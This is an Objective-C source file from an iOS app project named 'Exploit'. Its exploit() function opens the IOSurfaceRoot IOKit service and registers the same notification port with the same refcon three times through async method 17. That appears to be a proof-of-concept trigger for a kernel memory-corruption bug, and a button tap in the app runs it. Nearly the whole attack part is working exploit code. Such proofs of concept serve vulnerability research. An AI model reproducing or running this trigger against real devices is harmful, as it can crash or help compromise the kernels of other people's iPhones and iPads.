//
//  ViewController.m
//  Exploit
//
//  Created by Tyler Jaacks on 12/6/17.
//  Copyright © 2017 Tyler Jaacks. All rights reserved.
//

#import "ViewController.h"

#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach_port.h>
#include <stdio.h>
#include <stdlib.h>

#include "IOKitLib.h"
#include "IOTypes.h"

void exploit()
{
    CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
    io_connect_t connect = 0;
    IOServiceOpen(service, mach_task_self(), 0, &connect);
    
    // add notification port with same refcon multiple times
    mach_port_t port = 0;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    uint64_t references;
    uint64_t input[3] = {0};
    input[1] = 1234;  // keep refcon the same value
    
    for (int i=0; i<3; i++)
    {
        IOConnectCallAsyncStructMethod(connect, 17, port, &references, 1, input, sizeof(input), NULL, NULL);
    }
    
    IOServiceClose(connect);
}

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


- (IBAction)OnClick:(id)sender {
    exploit();
}

@end
